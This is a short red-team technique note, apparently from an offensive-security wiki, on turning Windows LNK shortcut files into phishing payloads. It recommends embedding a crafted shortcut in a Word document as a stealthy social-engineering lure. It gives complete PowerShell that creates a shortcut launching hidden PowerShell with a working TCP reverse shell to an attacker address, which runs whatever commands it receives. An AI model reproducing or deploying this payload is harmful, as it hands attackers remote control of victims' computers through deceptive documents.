# LNK
According to Microsoft’s documentation on [MS-SHLLINK]: Shell Link (.LNK) Binary File Format, in this format a structure is called a shell link, or shortcut, and is a data object that contains information that can be used to access another data object.
We can craft LNK files that reference useful target files such as cmd.exe or PowerShell. There is a restriction for 260 symbols in summary for LNK files when standard Windows properties form is used.

A relatively stealthy social engineering attack would be sending a crafted LNK file embedded as an OLE object in a Word Document.

## Create LNK file
With rev-shell via tcp

```powershell
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("c:\lnk_tests\payload.lnk")
$Shortcut.TargetPath = "%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,21"
$Shortcut.Arguments = '-windowstyle hidden /c $sm=(New-Object Net.Sockets.TCPClient("attacker IP",55555)).GetStream();[byte[]]$bt=0..255|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} '
$Shortcut.Save()
```

## Tools
########
########

```meta
ttp: T1000
internal: false
requirements:
results: user, admin
description: LNK (Shell Link file) remotly/localy executing code 
```
